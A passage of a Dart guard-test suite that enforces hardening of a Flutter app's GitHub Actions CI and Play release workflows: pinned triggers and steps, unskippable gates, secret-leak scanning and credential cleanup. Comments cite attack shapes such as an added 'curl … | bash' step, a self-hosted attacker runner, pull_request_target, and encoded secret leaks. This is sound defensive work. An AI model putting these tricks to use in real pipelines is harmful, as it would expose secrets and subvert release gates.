@Tags(['guard'])
library;

// Guard for #18: every action in every workflow is pinned, every workflow
// declares its permissions and its concurrency, and the two files that state
// the Flutter version agree.
//
// Why a guard rather than review: an unpinned action is a third party that can
// change between the run that went green and the run that ships, inside the
// merge gate. The plugin's own lessons name this as the failure that has
// bitten before, and "we will remember to pin" is not a control.
//
// What this does NOT cover: whether a pinned major is current — that is
// Dependabot's job, which is why the `github-actions` ecosystem is asserted
// here too. Nor whether the required-status-check context string matches the
// job name; that lives in the repository ruleset and is recorded on the issue.
import 'dart:convert';
import 'dart:io';
import 'dart:isolate';

import 'package:flutter_test/flutter_test.dart';

import 'repo_files.dart';
import 'workflow_rules.dart';
import 'workflow_yaml.dart';

const _workflowDir = '.github/workflows';

List<String> _workflowFiles() {
  final dir = Directory('${repoRoot.path}/$_workflowDir');
  if (!dir.existsSync()) return const [];
  return dir
      .listSync() // top level only, deliberately: nothing nested runs
      .whereType<File>()
      .map((f) => f.path.substring(repoRoot.path.length + 1))
      .where((p) => p.endsWith('.yml') || p.endsWith('.yaml'))
      .toList()
    ..sort();
}

/// A minimal, valid workflow around [steps].
///
/// The rules parse now, so a fixture must be a real document rather than a
/// loose fragment — which is the point: a fragment could never have exercised
/// a flow mapping, an anchor or a second job.
String _workflow(String steps) =>
    'name: Fixture\n'
    'on: workflow_dispatch\n'
    'permissions:\n'
    '  contents: read\n'
    'concurrency: fixture\n'
    'jobs:\n'
    '  a:\n'
    '    runs-on: ubuntu-latest\n'
    '    steps:\n'
    '$steps';

/// One step whose `run:` is [script], as a block scalar.
String _runStep(String script) {
  final indented = script.split('\n').map((l) => '          $l').join('\n');
  return '      - run: |\n$indented\n';
}

/// Every structural property #20's criteria depend on, as one function so
/// the negative test below can run it against a mutated workflow and
/// require it to fail. An assertion with no proof that it can fail is what
/// #154 was.
/// The command a step runs, as one line, or null when it runs none.
///
/// `contains` was the wrong question: appending `|| true` keeps the substring,
/// so `tools/gate.sh || true` satisfied an assertion whose whole point was
/// that CI obeys the gate (#167). A step whose job is "run this and let it
/// decide" has exactly one correct body, so the assertion is equality.
String? _soleCommand(WorkflowStep? step) {
  final run = step?.run;
  if (run == null) return null;
  final lines = run
      .split('\n')
      .map((l) => l.trim())
      .where((l) => l.isNotEmpty && !l.startsWith('#'))
      .toList();
  return lines.length == 1 ? lines.single : null;
}

/// [step] must run exactly [command] — no `|| true`, no second line, no
/// trailing conjunction that could swallow its exit status.
void _expectRunsExactly(WorkflowStep? step, String command, String why) {
  expect(step, isNotNull, reason: '$why: the step is gone');
  expect(
    _soleCommand(step),
    command,
    reason:
        '$why must run `$command` and nothing else, so that its exit '
        'status is the step\'s. Found: ${step!.run?.replaceAll('\n', ' ⏎ ')}',
  );
}

/// No job anywhere runs on someone else's machine, or in a deployment
/// environment carrying its own secrets and reviewers.
///
/// Asserted in `_assertReleaseShape` only, so `runs-on: attacker-self-hosted`
/// on ci.yml's gate job was green — and ci.yml is `workflow_call`ed with
/// `secrets: inherit` (#197).
void _assertRunnerAndEnvironment(Workflow wf) {
  for (final job in wf.jobs) {
    if (job.uses != null) continue;
    expect(
      job.runsOn,
      'ubuntu-latest',
      reason:
          '${wf.path}: job `${job.name}` runs on `${job.runsOn}`. A '
          'self-hosted runner would see every secret this workflow holds',
    );
    expect(
      job.environment,
      isNull,
      reason:
          '${wf.path}: job `${job.name}` declares environment '
          '`${job.environment}`, which carries its own secrets and reviewers',
    );
  }
}

/// Every Play upload in a workflow, as `job.step`.
///
/// The "exactly one upload in the whole file" rule lived only in
/// _assertReleaseShape, so the class #169 closed was open one file over:
/// release.yml's gate job is `uses: ./.github/workflows/ci.yml` with
/// `secrets: inherit`, which puts PLAY_SERVICE_ACCOUNT_JSON in scope inside
/// ci.yml on a tag push — and an upload step added there was green (#182).
List<String> _playUploads(Workflow wf) => [
  for (final job in wf.jobs)
    for (final step in job.steps)
      if (_isPlayUpload(step)) '${job.name}.${step.id ?? step.index}',
];

/// No workflow but release.yml may talk to Play at all.
void _expectNoPlayUpload(Workflow wf) {
  expect(
    _playUploads(wf),
    isEmpty,
    reason:
        'upload-scope: ${wf.path} contains a Play upload step. Only '
        'release.yml may upload, and only from `ship`. This file runs with '
        'the same secrets — ci.yml through `secrets: inherit` on a tag push',
  );
}

/// Everything #18's criteria depend on in ci.yml. A function, not an
/// inline test, so the negative battery below can run it against a
/// mutated file — the release side had that and this did not (#170).
void _assertCiShape(Workflow ci) {
  expect(ci.problem, isNull);
  // Equality, not containsAll. `containsAll` is one-directional: it says
  // the expected triggers are present and nothing about what was added
  // beside them, so `pull_request_target` — which runs fork code in the
  // BASE repository's context, with its secrets — was green (#170).
  // release.yml already asserted its trigger by equality, so the right
  // form was available and the weaker one was chosen here.
  expect(
    ci.triggers..sort(),
    ['pull_request', 'workflow_call'],
    reason:
        'ci-shape: exactly these triggers. pull_request_target would run '
        'a fork\'s code against this repository\'s secrets',
  );
  expect(ci.jobs.map((j) => j.name).toList(), [
    'gate',
    'mutations',
  ], reason: 'ci-shape: exactly these jobs — another one can run anything');
  _expectRunsExactly(
    ci.job('mutations')!.stepById('mutations'),
    'tools/mutation_check.py',
    'ci-shape: the mutation battery must actually run',
  );
  _expectNoPlayUpload(ci);
  _assertRunnerAndEnvironment(ci);

  // Same inversion as release.yml, and the same reason: `continue-on-error`
  // on `shellcheck` was green because only three steps were checked (#197).
  // `artifact` is the one legitimate exception: it uploads the PR bundle and
  // must NOT run when release.yml calls this workflow on a tag. Named, so a
  // second exception is a deliberate edit rather than a silence.
  const ciMayBeConditional = {'artifact'};
  for (final job in ci.jobs) {
    for (final step in job.steps) {
      if (ciMayBeConditional.contains(step.id)) {
        expect(
          step.ifExpression,
          "github.event_name == 'pull_request'",
          reason:
              'ci-shape: `${step.id}` may be conditional only on being a '
              'pull request — that is why it is exempt',
        );
        expect(step.continueOnError, isFalse);
        continue;
      }
      expect(
        step.isUnconditional,
        isTrue,
        reason:
            'ci-shape: step `${step.id ?? step.index}` of `${job.name}` is '
            'conditional (if: ${step.ifExpression}, continue-on-error: '
            '${step.continueOnError}) — nothing in the gate may be skippable',
      );
    }
  }

  // The step SET, not just three ids and two indexes. An added
  // `run: curl -sSL … | bash` in the gate job was invisible, and so was a
  // full Play upload (#182).
  expect(
    ci.job('gate')!.steps.map((s) => s.id).toList(),
    [
      'checkout',
      'shellcheck',
      'java',
      'flutter',
      'deps',
      'guards',
      'gate',
      'artifact',
    ],
    reason:
        'ci-shape: exactly these steps in this order — an added step in the '
        'gate job runs with whatever secrets the caller inherited',
  );
  expect(ci.job('mutations')!.steps.map((s) => s.id).toList(), [
    'checkout',
    'java',
    'flutter',
    'deps',
    'mutations',
  ], reason: 'ci-shape: exactly these steps in the mutations job');
  for (final job in ci.jobs) {
    // `if: false` on the gate JOB disabled the entire merge gate with the
    // suite green — and `gate` is the repository's one required status
    // check, which a skipped job does not block. Every criterion below is
    // about the steps of a job nothing required to run. _assertReleaseShape
    // already asserted this for `ship`, so the right form was in the same
    // file and the weaker one was used (#189).
    expect(
      job.ifExpression,
      isNull,
      reason:
          'ci-shape: job `${job.name}` carries `if: ${job.ifExpression}`. A '
          'skipped job reports as skipped, and a skipped required check does '
          'not block a merge',
    );
    expect(
      job.continueOnError,
      isFalse,
      reason:
          'ci-shape: job `${job.name}` carries `continue-on-error`, so '
          'its failure would not block the merge it exists to block',
    );
  }

  final gate = ci.job('gate');
  expect(gate, isNotNull, reason: 'ci-shape: no gate job');
  final ids = gate!.steps.map((s) => s.id).toList();
  expect(ids.first, 'checkout');
  // Never compared to anything: `./does-not-exist` makes Shellcheck scan
  // nothing and still pass, and `severity: error` silently stops it
  // reporting warnings (#170).
  final shellcheck = gate.stepById('shellcheck')!;
  expect(shellcheck.uses, 'ludeeus/action-shellcheck@2.0.0');
  expect(
    shellcheck.with_['scandir'],
    './tools',
    reason: 'ci-shape: Shellcheck must scan the scripts directory',
  );
  expect(
    shellcheck.with_['severity'],
    'warning',
    reason: 'ci-shape: raising the severity floor hides findings',
  );
  expect(
    ids.indexOf('shellcheck'),
    1,
    reason:
        'ci-shape: Shellcheck runs before the toolchain — it takes '
        'seconds and a shell error should not wait for Gradle',
  );

  _expectRunsExactly(
    gate.stepById('deps'),
    'flutter pub get --enforce-lockfile',
    'ci-shape: dependencies must resolve against the lockfile',
  );
  _expectRunsExactly(
    gate.stepById('guards'),
    'flutter test --no-pub --tags guard',
    'ci-shape: the invariant guards must be their own step',
  );
  _expectRunsExactly(
    gate.stepById('gate'),
    'tools/gate.sh',
    'ci-shape: the gate step must run the same script as local',
  );

  for (final id in const ['deps', 'guards', 'gate']) {
    expect(
      gate.stepById(id)!.isUnconditional,
      isTrue,
      reason: 'ci-shape: `$id` must not be skippable',
    );
  }

  final artifact = gate.steps.firstWhere(
    (s) => (s.uses ?? '').contains('upload-artifact'),
  );
  expect(artifact.with_['retention-days'], '7');
  expect(artifact.with_['if-no-files-found'], 'error');
}

/// Lines that end a command's exit status rather than letting it fail.
///
/// `|| true` appended to a step's last command makes the step green whatever
/// the command did. #167 converted six assertions to equality, which catches
/// this for single-command steps; a multi-line body needs a different check,
/// and `keystore_check` and `build` had none at all (#189).
///
/// A trailing `|| true` on a cleanup line inside a longer script is often
/// deliberate, so this looks only at lines running a project tool or keytool
/// — the commands whose failure is the point of the step.
List<String> _swallowsFailure(String body) {
  // Join backslash continuations FIRST. Without this the scan has the defect
  // it is checking for: `keytool ... \` on one line and `-alias ... || true`
  // on the next are different lines (#183, #189).
  final joined = body.replaceAll(RegExp(r'\\\n\s*'), ' ');
  final offenders = <String>[];
  for (final raw in joined.split('\n')) {
    // Comments stripped. `|| true # tolerate a wrong alias` reinstated the
    // defect outright, because this helper never stripped them — while the
    // sibling rule twenty lines away has had `_stripComment` all along
    // (#197).
    final line = raw.split('#').first.trim();
    if (line.isEmpty) continue;

    // `set +e` disarms the whole body, so it is its own offence rather than
    // something to look for at the end of a line (#197).
    if (RegExp(r'(^|[;&|(]\s*)set\s+\+[a-z]*e').hasMatch(line)) {
      offenders.add(line);
      continue;
    }

    // `gh` was missing, and `gh release upload` is the entire point of the
    // `asset` step — the step #138's fix exists for (#197).
    final runsSomething = RegExp(
      r'(^|\s)(tools/\S+|keytool|flutter|gh|base64|sha256sum|curl|unzip)\b',
    ).hasMatch(line);
    if (!runsSomething) continue;

    // Every spelling of "and do not fail", not one. `|| true` was the only
    // form matched, so `|| :`, `|| /bin/true`, `|| exit 0` and a trailing
    // semicolon all walked past (#197).
    if (RegExp(r'\|\|\s*(true|:|/bin/true|/usr/bin/true|exit\s+0)\s*;?\s*$')
        .hasMatch(line)) {
      offenders.add(line);
    }
  }
  return offenders;
}

/// The command each workflow step's success depends on.
///
/// Top level because three tests need it: `a step fails when the command it
/// runs fails` executes against it, `every declared key link is actually
/// wired` asserts each link a story promised is covered by that execution,
/// and `every [] step is exercised by a named test` closes the exemptions.
///
/// `[]` means ONE thing: the step runs no command the propagation check can
/// stub, so that check never executes it. It does not mean the step's
/// failure is harmless — `secrets_present` exists to fail — and it is not a
/// waiver. Every `[]` step must be named by another test that runs it
/// (`_claims`, `_destroys` or `_preflight`), and the closure test asserts
/// those two sets are the same.
const _dependsOn = <String, Map<String, Map<String, List<String>>>>{
  '.github/workflows/ci.yml': {
    'gate': {
      'deps': ['flutter'],
      'guards': ['flutter'],
      'gate': ['tools/gate.sh'],
    },
    'mutations': {
      'deps': ['flutter'],
      'mutations': ['tools/mutation_check.py'],
    },
  },
  '.github/workflows/release.yml': {
    'ship': {
      'secrets_present': [],
      'version': ['tools/ci_version.sh'],
      'deps': ['flutter'],
      'keystore': ['base64'],
      'keystore_check': ['keytool'],
      'build': ['flutter'],
      'scan': ['tools/check_aab.sh'],
      'cert': ['tools/verify_upload_cert.sh'],
      'sidecar': ['sha256sum'],
      'asset': ['gh'],
      'summary': [],
      'name_failure': [],
      'shred': [],
    },
    'report-gate-failure': {'say': []},
  },
  '.github/workflows/play-promote.yml': {
    'promote': {
      'refuse': [],
      'token': ['gcloud'],
      'promote': ['tools/play_promote.sh'],
      'summary': [],
      'forget': [],
    },
  },
  '.github/workflows/play-api-check.yml': {
    'check': {
      'play': ['gcloud'],
      'keystore': ['keytool'],
      'forget': [],
    },
  },
};

/// Every command any step in any workflow is exercised against.
///
/// Shared so a test that runs a body for a reason other than propagation —
/// asking what it published, or whether it removed a credential — stubs the
/// same set and does not quietly diverge from it.
final Set<String> _ambientCommands = {
  for (final jobs in _dependsOn.values)
    for (final steps in jobs.values)
      for (final commands in steps.values) ...commands,
};

/// Every command any step of [workflow] is exercised against.
Set<String> _propagationCommands(String workflow) => {
  for (final steps in (_dependsOn[workflow] ?? const {}).values)
    for (final commands in steps.values) ...commands,
};

/// True for the 403 GitHub returns when a caller has run out of requests.
///
/// A predicate rather than an inline condition because the branch it guards
/// is hard to reach on demand — the limit resets hourly — and an untested
/// branch is exactly what #219 is about. Its own test feeds it a recorded
/// response body, so the string match is falsifiable without waiting for a
/// real 403.
bool _isRateLimited(String status, String payload) {
  // 403 OR 429. GitHub answers primary and secondary rate limits with
  // either, and a 429 falling through to `expect(status, '200')` turns the
  // ruleset guard red for a reason that has nothing to do with the ruleset —
  // and in the battery, into a cascade of WRONG-REASON (#230).
  if (status != '403' && status != '429') return false;
  final body = payload.toLowerCase();
  return body.contains('rate limit') || body.contains('secondary rate');
}

/// What the ruleset guard concludes from `bypass_actors`.
///
/// Separated from the HTTP read for the same reason as `_isRateLimited`:
/// the branch where the field IS readable needs a token with repository
/// Administration, which a maintainer's shell may lack and the battery's
/// local run certainly does. A predicate fed recorded shapes is testable
/// everywhere; the same branch inside the network test was testable nowhere
/// (#228).
///
/// [env] is the process environment, and the key that matters in it is
/// `HS_RULESET_READ_EXPECTED` — CI's statement that the token it passed can
/// read the field, set only when the secret is non-empty. With it, an absent
/// field is a FAILURE, not a skip: the token has lapsed or lost its
/// permission, and a skip on a required check is how a control degrades
/// without anyone noticing.
///
/// The map is a parameter rather than a read of `Platform.environment` in
/// here, so that the KEY and the comparison sit inside what the test
/// exercises: a pre-computed `expected:` flag left both untested, and
/// hard-coding it `false` at the call site was green (#240). What stays
/// untestable in-process is the one line that passes the real environment
/// in — a test cannot set its own process environment — and that line, not
/// the branch, is the residue.
({bool skip, String? problem}) _bypassVerdict(
  Object? bypass,
  Map<String, String> env,
) {
  final expected = env['HS_RULESET_READ_EXPECTED'] == '1';
  if (bypass == null) {
    if (expected) {
      return (
        skip: false,
        problem:
            'ruleset: HS_RULESET_READ_TOKEN was expected to read '
            '`bypass_actors` and the field is absent — the token has lapsed '
            'or lost Administration read. Rotate it (#228)',
      );
    }
    return (skip: true, problem: null);
  }
  if (bypass is List && bypass.isEmpty) return (skip: false, problem: null);
  return (
    skip: false,
    problem:
        'ruleset: $bypass can push to `main` without the checks. A bypass '
        'actor is the gate not applying to whoever matters most',
  );
}

/// Secrets whose value is public by design.
///
/// The keystore ALIAS is in `android/signing/README.md`, on keytool's command
/// line, and play-api-check reports it in its summary on purpose.
/// `secrets_scripts_test.dart` excludes it from sentinel derivation for the
/// same reason; naming it here by the SECRET rather than by whatever env key
/// it is bound to is what keeps the two honest (#225).
const _publicSecrets = {'HS_KEY_ALIAS'};

/// The shapes a value can take on its way into a log.
///
/// A step that pipes a secret through `rev` or `base64` has published it as
/// surely as one that echoes it, and a reader of the run summary reverses
/// either instantly. Searching the literal only let both through (#225).
///
/// Deliberately smaller than `secrets_scripts_test.dart`'s `_leakForms`: this
/// runs over every step of every workflow, and it carries the transforms a
/// shell reaches for without thinking.
///
/// Open by decision, not by oversight: hex, rot13, a value split across two
/// writes, reversed-then-base64, and a DIGEST of the secret. All five were
/// tested open on 2026-09-22 — the verbatim control is caught at the same
/// injection point, each of these is not.
///
/// The digest is the interesting one and the reason given for it here was
/// wrong: it does NOT need a new dependency, because `_runReal` already runs
/// the host's `sha256sum` and fails without it. What it costs is one more
/// form per secret in a scan that runs over every step of every workflow,
/// which is a judgement rather than an impossibility (#241, #251).
Iterable<String> _leakShapes(String secret) sync* {
  yield secret;
  yield secret.split('').reversed.join();
  yield base64.encode(utf8.encode(secret));
  yield secret.toLowerCase();
  yield secret.toUpperCase();
}

/// The credential files the harness plants in `$RUNNER_TEMP` before a body
/// runs.
///
/// Planting ONLY. The steps that promise to remove them are named per step
/// in `_destroys`, each with the files it removes, and that test asserts
/// every named file EXISTS before the body runs. So a file named there and
/// missing here is detected, not prevented: #224 was the harness planting
/// `upload.keystore` alone, so "is `play-sa.json` gone?" was true before the
/// body ran, and the precondition is what now refuses that.
const _runnerCredentials = ['upload.keystore', 'play-sa.json'];

/// A value nothing else could produce, in the base64 alphabet and padded to
/// a length base64 accepts, so a body may run it through a real decoder.
String _sentinel(String tag) {
  final raw = 'HS0SENTINEL0${tag}0DONOTPUBLISH';
  return raw.padRight((raw.length + 3) ~/ 4 * 4, 'A');
}

/// The stubs that run the real command rather than pretend to be it.
///
/// `base64` printed a fixed word, so a secret piped through it never came
/// out encoded and `_leakShapes`' base64 form could not fire — the issue's
/// own reproducer was green (#232). `sha256sum` printed the same word, so
/// the summary's digest row said "stub". A succeeding stub must behave enough
/// like the command for a correct step to produce real output, or the
/// positive control passes while the property goes untested; `curl` and
/// `keytool` learned that in round eight and keep synthetic output only
/// because the real ones need a network and a keystore.
const _runReal = {'base64', 'sha256sum'};

/// Where the host keeps [command], for [_runReal].
///
/// By path, not by PATH: the harness PATH is `bin:/usr/bin:/bin`, and macOS
/// keeps `sha256sum` in `/sbin`. Null when the host has no such command, at
/// which point the caller fails rather than substituting an echo: the
/// fallback that stood there was silent, and with it the base64 hole #232
/// closed would have reopened on any host missing the binary, green (#240).
String? _realBinary(String command) {
  for (final dir in const ['/usr/bin', '/bin', '/sbin', '/usr/sbin']) {
    final candidate = File('$dir/$command');
    if (candidate.existsSync()) return candidate.path;
  }
  return null;
}

/// One step whose output must tell the truth, and the truth it must tell.
///
/// [completes] is the positive control: a body that cannot run says nothing,
/// and "it did not say the wrong thing" is true of silence. `false` is for
/// steps whose job on this input is to REFUSE, where completing is the lie.
typedef _Claim = ({
  String path,
  String job,
  String step,
  Map<String, String> env,
  Map<String, String> expressions,
  Map<String, String> plant,
  bool completes,
  List<String> mustSay,
  List<String> mustNotSay,
});

/// What `toJSON(steps)` holds after `build` failed: the shape GitHub renders,
/// pretty-printed, because `name_failure` greps it with `-B2` to reach the
/// step's name two lines above its outcome.
const _stepsWithOneFailure = '''
{
  "version": {
    "outputs": {},
    "outcome": "success",
    "conclusion": "success"
  },
  "build": {
    "outputs": {},
    "outcome": "failure",
    "conclusion": "failure"
  },
  "scan": {
    "outputs": {},
    "outcome": "skipped",
    "conclusion": "skipped"
  }
}''';

/// The same object when nothing failed.
const _stepsAllSucceeded = '''
{
  "version": {
    "outputs": {},
    "outcome": "success",
    "conclusion": "success"
  },
  "build": {
    "outputs": {},
    "outcome": "success",
    "conclusion": "success"
  }
}''';

/// The `[]` steps that make a claim, and what each must and must not say.
///
/// Top level so `every [] step is exercised by a named test` can hold this
/// map to the `[]` set in `_dependsOn` (#226).
const _claims = <String, _Claim>{
  'the failed-gate notice does not claim a release': (
    path: '.github/workflows/release.yml',
    job: 'report-gate-failure',
    step: 'say',
    env: {'TAG': 'v9.9.9'},
    expressions: {},
    plant: {},
    completes: true,
    mustSay: ['nothing shipped', 'v9.9.9'],
    mustNotSay: ['shipped to', 'uploaded', 'succeeded'],
  ),
  'the failure diagnostic names the failing step, and only it': (
    path: '.github/workflows/release.yml',
    job: 'ship',
    step: 'name_failure',
    env: {},
    // The value the runner would substitute, so the grep has something real
    // to find. With the default placeholder the grep matched nothing and
    // `|| true` kept the step green whatever it printed — "diagnostics
    // disabled" passed (#226).
    expressions: {'toJSON(steps)': _stepsWithOneFailure},
    plant: {},
    completes: true,
    mustSay: ['"build"', '"outcome": "failure"'],
    mustNotSay: ['"version"', '"scan"', 'no step failed'],
  ),
  'the failure diagnostic is silent when nothing failed': (
    path: '.github/workflows/release.yml',
    job: 'ship',
    step: 'name_failure',
    env: {},
    expressions: {'toJSON(steps)': _stepsAllSucceeded},
    plant: {},
    completes: true,
    mustSay: [],
    mustNotSay: ['"outcome"', '"build"'],
  ),
  'the release summary names the real track and version': (
    path: '.github/workflows/release.yml',
    job: 'ship',
    step: 'summary',
    env: {'TAG': 'v9.9.9'},
    // The version step's real outputs, so the rows that carry them can be
    // asserted rather than expanded to a placeholder (#261).
    expressions: {
      'steps.version.outputs.name': '0.1.0',
      'steps.version.outputs.code': '1021',
    },
    plant: {},
    completes: true,
    mustSay: [
      '### Release v9.9.9',
      '| track | internal |',
      '| package | com.honestarcade.sudoku |',
      // The two version rows, which AC7 names and nothing asserted: deleting
      // either from the summary was green, so the one number a reader needs
      // to find the build on Play could vanish silently (#261).
      '| version name | 0.1.0 |',
      '| version code | 1021 |',
      // The digest, not the prefix. `| bundle SHA-256 | ` alone was
      // satisfied by `stub output for sha256sum`, so half of #232's fix —
      // that the stub runs the real binary — was asserted by nothing
      // (#240). This is sha256 of the six bytes `_runStepBody` plants as
      // the bundle; change that content and this row is what tells you.
      '| bundle SHA-256 | '
          '1e6ed65d77d6364eeaed5a745ba5c4985ae2b700dd85d7cf7f027bdf294a33fc |',
    ],
    mustNotSay: ['production', 'all checks passed'],
  ),
  'the release summary carries the no-release-note fallback': (
    path: '.github/workflows/release.yml',
    job: 'ship',
    step: 'summary',
    env: {'TAG': 'v9.9.9'},
    expressions: {},
    // What `asset` leaves behind when the GitHub release is missing (#180).
    plant: {
      'runner/no-release-note':
          'NO0RELEASE0NOTE0SENTINEL: no GitHub release for this tag',
    },
    completes: true,
    mustSay: ['NO0RELEASE0NOTE0SENTINEL'],
    mustNotSay: [],
  ),
  'the promote refusal refuses production, by name': (
    path: '.github/workflows/play-promote.yml',
    job: 'promote',
    step: 'refuse',
    env: {'FROM_TRACK': 'internal', 'TO_TRACK': 'production'},
    expressions: {},
    plant: {},
    completes: false,
    mustSay: ['production is a human act'],
    mustNotSay: ['accepted'],
  ),
  'the promote refusal accepts a testing track': (
    path: '.github/workflows/play-promote.yml',
    job: 'promote',
    step: 'refuse',
    env: {'FROM_TRACK': 'internal', 'TO_TRACK': 'alpha'},
    expressions: {},
    plant: {},
    completes: true,
    mustSay: ['internal -> alpha accepted'],
    mustNotSay: ['is not one of', 'human act'],
  ),
  'the promote summary does not claim a promotion that did not happen': (
    path: '.github/workflows/play-promote.yml',
    job: 'promote',
    step: 'summary',
    env: {
      'PROMOTE_OUTCOME': 'failure',
      'FROM_TRACK': 'internal',
      'TO_TRACK': 'alpha',
    },
    expressions: {},
    plant: {},
    completes: true,
    mustSay: ['Nothing was promoted', 'internal -> alpha'],
    mustNotSay: ['Promoted on Play'],
  ),
  'the promote summary reports the promotion that happened': (
    path: '.github/workflows/play-promote.yml',
    job: 'promote',
    step: 'summary',
    env: {
      'PROMOTE_OUTCOME': 'success',
      'FROM_TRACK': 'internal',
      'TO_TRACK': 'alpha',
    },
    expressions: {},
    plant: {'runner/promote.out': 'promoted=42\nstatus=completed\n'},
    completes: true,
    mustSay: [
      'Promoted on Play: versionCode [42], internal -> alpha '
          '(release status: completed)',
    ],
    mustNotSay: ['Nothing was promoted'],
  ),
};

/// The `[]` steps that exist to destroy a credential, and the files each
/// removes from `$RUNNER_TEMP`. Top level for the same closure test.
const _destroys = <String, ({String job, String step, List<String> files})>{
  '.github/workflows/release.yml': (
    job: 'ship',
    step: 'shred',
    files: ['upload.keystore'],
  ),
  '.github/workflows/play-promote.yml': (
    job: 'promote',
    step: 'forget',
    files: ['play-sa.json'],
  ),
  '.github/workflows/play-api-check.yml': (
    job: 'check',
    step: 'forget',
    files: ['play-sa.json', 'upload.keystore'],
  ),
};

/// The one `[]` step covered by `the secrets pre-flight refuses a missing
/// secret`, named here so the closure test can count it.
const _preflight = (
  path: '.github/workflows/release.yml',
  job: 'ship',
  step: 'secrets_present',
);

/// Runs a workflow step's `run:` body the way the runner would.
///
/// Every command in [ambient] is stubbed; the one named by [failing] exits 1
/// and the rest exit 0. With no [failing] the body should SUCCEED, and that
/// direction is the point: an assertion that a step fails when its command
/// fails is worthless if the step fails whatever happens (#204).
///
/// Two fidelity details the first version got wrong, both of which made a
/// step unable to pass:
///
///  * **`${{ … }}` is expanded before bash ever sees the body.** Left in
///    place it is a bad substitution, and `set -u` aborts the script at the
///    first one — before the command under test is reached. `build` was
///    asserted for nothing because of this.
///  * **The workspace has the files the body opens.** A redirect into a
///    directory that does not exist fails for a reason that has nothing to
///    do with the command being tested (`sidecar`).
({int code, String out, String err, String wrote, Directory workspace})
_runStepBody(
  String body, {
  required Iterable<String> ambient,
  String? failing,
  Map<String, String> extraEnv = const {},
  Map<String, String> expressions = const {},
  Map<String, String> plant = const {},
  bool keepWorkspace = false,
  void Function(Directory workspace)? beforeRun,
}) {
  final dir = Directory.systemTemp.createTempSync('hs-stepbody');
  try {
    final bin = Directory('${dir.path}/bin')..createSync(recursive: true);

    // Every file the HARNESS writes, with the exact text it wrote.
    //
    // The `wrote` channel skips these, and it skips them by CONTENT: a file
    // whose bytes still match what was put there is not something the body
    // wrote. Skipping by path shape instead — `bin/**`, `step.sh`, any
    // planted path — meant a body could write a secret into one of them and
    // the channel dropped it, with the suite green (#243). `$GITHUB_WORKSPACE`
    // is this directory, and on a runner that is what upload-artifact sweeps.
    final harnessWrote = <String, String>{};

    void stub(String command) {
      final fails = command == failing;
      // A succeeding stub writes a byte, because several bodies redirect a
      // command's output to a file and then check the file is non-empty
      // (`keystore` does exactly that). A silent `exit 0` leaves an empty
      // file, so the step fails for want of output rather than for anything
      // the test is asking about — vacuity by a different route.
      //
      // `curl` gets a real one. The Play steps read its `-w '%{http_code}'`
      // and the file it writes with `-o`, and a stub that printed a fixed
      // word made every one of them exit at the status check — again
      // unable to pass whatever the body did.
      const curlStub = '''
#!/bin/sh
out=""
prev=""
for arg in "\$@"; do
  [ "\$prev" = "-o" ] && out="\$arg"
  prev="\$arg"
done
[ -n "\$out" ] && printf '{"id":"stub-edit","track":"internal","releases":[]}' > "\$out"
printf '200'
exit 0
''';
      // `gh release download --dir D` must leave the asset in D: `asset`
      // re-hashes the download with a REAL `sha256sum` now (#232), and a
      // stub that downloaded nothing failed the step for want of a file. The
      // copy is byte-identical to the built bundle, which is what a correct
      // `gh` delivers; whether the two hashes AGREE is the step's own logic,
      // and what is asked here is only whether `gh` failing reaches it.
      const ghStub = '''
#!/bin/sh
dir=""
prev=""
verb=""
for arg in "\$@"; do
  [ "\$prev" = "--dir" ] && dir="\$arg"
  [ "\$arg" = "download" ] && verb=download
  prev="\$arg"
done
if [ "\$verb" = download ] && [ -n "\$dir" ]; then
  mkdir -p "\$dir"
  cp build/app/outputs/bundle/release/app-release.aab "\$dir/app-release.aab"
fi
echo "stub output for gh"
exit 0
''';
      final String script;
      if (fails) {
        script = '#!/bin/sh\necho "\$command: simulated failure" >&2\nexit 1\n';
      } else if (command == 'curl') {
        script = curlStub;
      } else if (command == 'gh') {
        script = ghStub;
      } else if (command == 'keytool') {
        // Both fingerprints a body compares come from keytool — one from the
        // keystore listing, one from `-printcert` on the committed PEM — so
        // one constant listing makes a correct step pass. Nothing is faked
        // that the step is asserting: whether those two AGREE is the step's
        // own logic, exercised for real by play-api-check; what is asked
        // here is only whether keytool's failure reaches the step.
        script =
            '#!/bin/sh\n'
            'echo "Alias name: \${HS_KEY_ALIAS:-upload}"\n'
            'echo "SHA256: AA:BB:CC:DD:EE:FF"\n'
            'exit 0\n';
      } else if (_runReal.contains(command)) {
        final real = _realBinary(command);
        if (real == null) {
          fail(
            'stub-fidelity: this host has no `$command`, and the harness '
            'will not put an echo in its place. The leak scan needs a real '
            'encoder for an encoded secret to reach it, and a summary row '
            'reading "stub output" where a digest belongs is a test passing '
            'for the wrong reason (#232, #240)',
          );
        }
        script = '#!/bin/sh\nexec "$real" "\$@"\n';
      } else {
        script = '#!/bin/sh\necho "stub output for \$command"\nexit 0\n';
      }
      final stubPath = '${bin.path}/${command.split('/').last}';
      File(stubPath).writeAsStringSync(script);
      harnessWrote[stubPath] = script;
      Process.runSync('chmod', ['+x', stubPath]);
      // A project script is invoked by path, so shadow it there too.
      if (command.contains('/')) {
        final asPath = File('${dir.path}/$command');
        asPath.parent.createSync(recursive: true);
        asPath.writeAsStringSync(script);
        harnessWrote[asPath.path] = script;
        Process.runSync('chmod', ['+x', asPath.path]);
      }
    }

    for (final command in ambient) {
      stub(command);
    }
    // Not in any `dependsOn` list, but bodies call them and the host may not
    // have them (`sha256sum` is absent on older macOS), which would make a
    // result depend on who ran the suite.
    for (final command in const ['sha256sum', 'unzip', 'curl']) {
      if (!ambient.contains(command)) stub(command);
    }

    final runnerTemp = Directory('${dir.path}/runner')..createSync();
    for (final name in _runnerCredentials) {
      File('${runnerTemp.path}/$name').writeAsStringSync('x');
    }
    File('${dir.path}/build/app/outputs/bundle/release/app-release.aab')
      ..createSync(recursive: true)
      ..writeAsStringSync('bundle');

    // What the runner substitutes before the shell starts. By default a
    // plain word, so the body stays valid shell and what each expression
    // would really hold is left to the tests that pin the `env:` blocks. A
    // caller asking about an expression's VALUE — `name_failure` greps
    // `toJSON(steps)` — supplies it through [expressions] (#226).
    final expanded = body.replaceAllMapped(
      RegExp(r'\$\{\{([^}]*)\}\}'),
      (m) => expressions[m.group(1)!.trim()] ?? 'workflow-expression',
    );

    // Files the body reads that the fixed workspace does not have —
    // `$RUNNER_TEMP/no-release-note` is written by an earlier step of the
    // real job. Setup, declared by the caller; distinct from [beforeRun],
    // which asserts and does not arrange.
    plant.forEach((relative, content) {
      File('${dir.path}/$relative')
        ..createSync(recursive: true)
